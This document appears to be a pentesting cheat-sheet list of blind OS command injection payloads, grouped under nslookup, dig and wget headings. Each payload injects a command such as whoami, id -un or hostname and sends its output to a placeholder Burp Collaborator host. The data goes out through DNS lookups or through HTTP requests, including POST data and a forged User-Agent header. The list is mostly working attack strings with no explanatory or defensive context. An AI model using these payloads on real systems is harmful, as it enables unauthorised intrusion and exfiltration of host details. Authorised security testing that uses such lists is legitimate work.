-- -
## Payloads nslookup
```python
||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||``
x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`
nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
nslookup `whoami`.BURP-COLLABORATOR-SUBDOMAIN
nslookup $USER.BURP-COLLABORATOR-SUBDOMAIN
nslookup $(id -un).BURP-COLLABORATOR-SUBDOMAIN
nslookup x.BURP-COLLABORATOR-SUBDOMAIN
nslookup $(hostname).BURP-COLLABORATOR-SUBDOMAIN
```

## Payloads dig
```python
dig $(whoami).BURP-COLLABORATOR-SUBDOMAIN
dig `whoami`.BURP-COLLABORATOR-SUBDOMAIN
dig $USER.BURP-COLLABORATOR-SUBDOMAIN
dig @8.8.8.8 x.BURP-COLLABORATOR-SUBDOMAIN
```

## Payloads wget
```python
wget http://BURP-COLLABORATOR-SUBDOMAIN/$(whoami)
wget --post-data="data=$(id -un)" http://BURP-COLLABORATOR-SUBDOMAIN/
wget --header="User-Agent: $(hostname)" http://BURP-COLLABORATOR-SUBDOMAIN/
```